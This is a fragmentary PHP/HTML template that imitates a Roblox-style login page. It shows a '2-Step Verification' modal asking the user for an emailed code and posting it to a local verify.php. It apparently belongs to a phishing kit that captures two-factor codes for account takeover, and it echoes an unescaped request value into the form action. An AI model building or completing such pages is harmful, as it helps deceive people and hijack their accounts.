...
<body id="rbx-body" class="rbx-body <?=$loginColor["themeColor"]?>-theme gotham-font modal-open" data-performance-relative-value="0.005" data-internal-page-name="Login" data-send-event-percentage="0" style="overflow: hidden; padding-right: 17px;">
...
<div id="navigation-container" class="<?=$loginColor["themeColor"]?>-theme gotham-font  " data-number-of-autocomplete-suggestions="7" data-is-redirect-library-to-creator-marketplace-enabled="True">
...
<div role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block;"><div class="modal-dialog"><form action="verify.php?returnUrl=<?php echo $get ?>" method="post">
<div class="modal-content" role="document"><div title="" class="modal-header"><button type="button" class="modal-modern-header-button"><span class="icon-close"></span></button><h4 class="modal-title">2-Step Verification</h4><div class="modal-modern-header-info"></div></div><div class="modal-body"><div class="modal-lock-icon"></div><p class="modal-margin-bottom-xlarge">Enter the code we just sent you via email.</p><div class="input-control-wrapper"><div class="   form-group"> <input
  ...
  <!-- Original button -->
<input type="submit" name="fabutton" class="btn-cta-md modal-modern-footer-button" value="Verify" id="myButton">
